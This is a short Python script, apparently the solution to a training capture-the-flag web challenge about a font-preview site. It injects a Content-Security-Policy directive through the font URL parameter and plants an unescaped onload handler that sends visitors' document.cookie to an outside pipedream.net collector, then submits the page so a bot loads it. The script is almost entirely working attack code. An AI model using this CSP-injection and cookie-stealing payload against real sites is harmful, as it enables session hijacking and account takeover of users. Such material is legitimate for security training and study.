import requests
import string
import random
import re


url = "http://fonts.training.offdef.it"
 
def try_font(s, font_url, font_name, text):
	params = {
		"font_url": font_url,
		"font_name": font_name,
		"text": text
	}
	return s.get(url+"/try_font", params=params)

def share_font(s, font_url, font_name, text):
	data = {
		"font_url": font_url,
		"font_name": font_name,
		"text": text
	}
	return s.post(url+"/share", data=data)

s = requests.Session()

# the font url is used by javascript to download the font client-side but in order to do it,
# the csp must be modified by adding the provided url
font_url = "https://enehz78avxega.x.pipedream.net; script-src-attr 'self' 'unsafe-inline'" #csp injection
font_name = "wow"
# This field is not escaped, we create an element that when loaded its gonna send the cookies of the user to our server
text = "<body onload=\"window.location.href = 'https://enehz78avxega.x.pipedream.net?data=' + document.cookie\">wow</body>"

# The bot is sometimes broken, in the tests that I did I found that it works better if you
# first send a try_font request and then a share_font. I don't know why.
r = try_font(s, font_url, font_name, text)
share_font(s, font_url, font_name, text)
print(r.url)
